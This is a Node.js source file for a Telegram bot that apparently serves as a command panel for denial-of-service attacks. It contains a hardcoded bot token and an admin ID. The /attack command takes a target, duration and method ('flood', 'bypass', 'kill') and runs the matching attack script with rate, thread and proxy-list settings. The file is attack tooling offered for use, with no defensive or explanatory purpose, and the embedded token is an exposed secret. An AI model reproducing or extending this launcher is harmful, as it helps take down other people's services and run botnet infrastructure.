const TelegramBot = require('node-telegram-bot-api')
const si = require('systeminformation')
const { spawn } = require('child_process')

const token = '7937745403:AAFWtjpfNpZ7KUUAzj1Bw7g3arSB8T-EUE0'
const bot = new TelegramBot(token, { polling: true })
const adminId = 6601930239
const methods = ['flood', 'bypass', 'kill']

bot.onText(/\/system/, async (msg) => {
  if (msg.from.id !== adminId) return
  const chatId = msg.chat.id
  const cpu = await si.cpu()
  const mem = await si.mem()
  const os = await si.osInfo()
  const text =
    `*System Information:*\n` +
    `*OS:* ${os.distro} ${os.release}\n` +
    `*CPU:* ${cpu.manufacturer} ${cpu.brand} ${cpu.speed}GHz\n` +
    `*Cores:* ${cpu.cores}\n` +
    `*RAM:* ${Math.round(mem.total / 1024 / 1024)} MB\n` +
    `*Free:* ${Math.round(mem.free / 1024 / 1024)} MB`
  bot.sendMessage(chatId, text, { parse_mode: 'Markdown' })
})

bot.onText(/\/attack (.+)/, (msg, match) => {
  if (msg.from.id !== adminId) return
  const chatId = msg.chat.id
  const args = match[1].split(' ')
  if (args.length < 3) {
    bot.sendMessage(chatId, '*Usage:* /attack <target> <time> <method>', { parse_mode: 'Markdown' })
    return
  }
  const target = args[0]
  const time = args[1]
  const method = args[2].toLowerCase()
  if (!methods.includes(method)) {
    bot.sendMessage(chatId, `*Method not supported*\n*Available:* ${methods.join(', ')}`, { parse_mode: 'Markdown' })
    return
  }
  const rate = args[3] || '25'
  const threads = args[4] || '10'
  const proxyfile = args[5] || 'prx.txt'
  const process = spawn('node', [`${method}.js`, target, time, rate, threads, proxyfile])
  bot.sendMessage(chatId, `*Attack started*\n*Target:* ${target}\n*Time:* ${time}s\n*Method:* ${method}\n*Rate:* ${rate}\n*Threads:* ${threads}\n*ProxyFile:* ${proxyfile}`, { parse_mode: 'Markdown' })
})
